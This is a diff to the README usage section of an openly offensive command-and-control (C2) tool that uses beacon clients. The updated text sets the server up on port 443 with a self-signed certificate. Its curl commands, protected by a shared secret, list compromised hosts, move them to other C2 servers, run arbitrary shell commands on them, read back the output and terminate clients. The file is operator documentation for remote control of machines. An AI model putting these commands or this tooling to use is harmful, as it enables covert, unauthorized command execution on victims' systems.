@@ -5,24 +5,23 @@ Simplistic C2 infra using fairly dumb beacon clients.
 ## Usage
 
 ```
-python3 -m pip install -r requirements.txt
-
-python3 server.py
+sh install.sh # install dependencies and generate self signed cert
+sudo python3 server.py 443 # sudo only required to run on port 443
 
 # list hosts
-curl -X POST x.x.x.x:x/cmd -d "SECRET:L::"
+curl -X POST --insecure https://x.x.x.x/cmd -d "SECRET:L::"
 
 # migrate host to other c2 servers
-curl -X POST x.x.x.x:x/cmd -d "SECRET:N:HOST:y.y.y.y:y,z.z.z.z:z"
+curl -X POST --insecure https://x.x.x.x/cmd -d "SECRET:N:HOST:y.y.y.y:y,z.z.z.z:z"
 
 # execute command on host
-curl -X POST x.x.x.x:x/cmd -d "SECRET:C:HOST:ls -al"
+curl -X POST --insecure https://x.x.x.x/cmd -d "SECRET:C:HOST:ls -al"
 
 # show command output from host
-curl -X POST x.x.x.x:x/cmd -d "SECRET:I:HOST:"
+curl -X POST --insecure https://x.x.x.x/cmd -d "SECRET:I:HOST:"
 
 # terminate client on host
-curl -X POST x.x.x.x:x/cmd -d "SECRET:T:HOST:"
+curl -X POST --insecure https://x.x.x.x/cmd -d "SECRET:T:HOST:"
 ```
 
 ## Client Specification
